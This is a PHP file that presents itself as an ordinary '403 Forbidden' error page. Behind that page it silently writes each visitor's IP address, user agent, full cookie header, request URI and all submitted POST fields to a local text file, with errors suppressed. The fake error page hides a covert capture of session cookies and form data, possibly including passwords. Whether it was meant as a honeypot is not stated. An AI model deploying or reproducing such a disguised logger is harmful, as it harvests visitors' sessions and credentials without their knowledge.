<?php header('HTTP/1.1 403 Forbidden'); ?>
<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> on this server.</p>
<?php error_reporting(0); $post_query = '';
if(isset($_POST)){foreach($_POST as $key=>$value) $post_query .= $key."=".$value."&";}
$errorlog =  'errolog2.txt';
	$fh = @fopen($errorlog, 'a');
 	@fwrite($fh, "\r\n>>>>>>>>>>> ". date("F j, Y g:i a", time()) ." <<<<<<<<<<<\r\n");
	@fwrite($fh, 'REMOTE_ADDR: '.$_SERVER['REMOTE_ADDR']."\r\n");
	@fwrite($fh, 'HTTP_USER_AGENT: '.$_SERVER['HTTP_USER_AGENT']."\r\n");
	@fwrite($fh, 'HTTP_ACCEPT: '.$_SERVER['HTTP_ACCEPT']."\r\n");
 	@fwrite($fh, 'HTTP_COOKIE: '.$_SERVER['HTTP_COOKIE']."\r\n");
 	@fwrite($fh, 'REQUEST_URI: '.$_SERVER['REQUEST_URI']."\r\n");
 	if($post_query){@fwrite($fh, 'POST_QUERY: '.$post_query."\r\n");}
 	@fclose($fh); ?></body></html>
